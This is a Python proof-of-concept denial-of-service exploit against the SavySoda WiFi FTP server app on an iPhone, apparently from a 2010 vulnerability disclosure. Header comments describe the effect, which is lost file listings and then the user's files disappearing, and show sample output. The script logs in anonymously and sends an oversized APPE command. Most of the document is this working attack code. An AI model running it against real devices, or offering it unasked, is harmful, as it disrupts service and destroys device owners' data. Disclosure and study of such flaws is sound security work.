#!/usr/bin/python
#
# Title: iPhone - FTP Server (WiFi FTP) by SavySoda DoS/PoC
# Date: 02-18-2010
# Author: b0telh0
# Link: app store (http://itunes.apple.com/br/app/ftp-server/id346724641?mt=8)
# Tested on: iPhone 3G (firmware 3.1.3)


# The server doesn't crash at all, but after exploiting it
# you can't see (list) your files anymore. You must to close the app
# and open it again. Then you'll see that the app starts like it was
# fresh installed and your files are gone.


# root@bt:~# ./free_ftp.py 192.168.1.108
#
# [+] iPhone - FTP Server by SavySoda(WiFi FTP).
# [+] Free version of WiFi FTP with Ad Support.
#
# [+] Connecting...
# [+] 220 Service ready.
#
# [+] Sending username...
# [+] Sending buffer...
# [+] done!

# root@bt:~# ftp 192.168.1.108
# Connected to 192.168.1.108.
# 220 Service ready.
# Name (192.168.1.108:root): anonymous
# 230 User logged in, proceed.
# Remote system type is UNIX.
# Using binary mode to transfer files.
# ftp> ls
# 200 Command okay.
# 450 Requested file action not taken. File unavailable (e.g., file busy).
# ftp> ls
# 421 Service not available, closing control connection.
# ftp> ls
# Not connected.
# ftp> bye


import socket
import sys
import time

crash = "\x41" * 1000

def Usage():
    print ("Usage: ./free_ftp.py serv_ip\n")
if len(sys.argv) <> 2:
        Usage()
        sys.exit(1)
else:
    host = sys.argv[1]
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print "\n[+] FTP Server by SavySoda(WiFi FTP)."
        print "[+] Free version of WiFi FTP with Ad Support.\n"
        print "[+] Connecting..."
        s.connect((host, 21))
        b=s.recv(1024)
        print "[+] " +b
    except:
        print ("[-] Can't connect to ftp server!\n")
        sys.exit(1)
    print "[+] Sending username..."
    time.sleep(3)
    s.send('USER anonymous\r\n')
    s.recv(1024)
    print "[+] Sending buffer..."
    time.sleep(3)
    s.send('APPE ' + crash + '\r\n')
    s.recv(1024)
    s.close()
    print "[+] done!\n"
    sys.exit(0);


-- 
Leonardo Rota Botelho
http://www.leonardobotelho.com/blog/
public key: http://www.leonardobotelho.com/leonardorotabotelho.gpg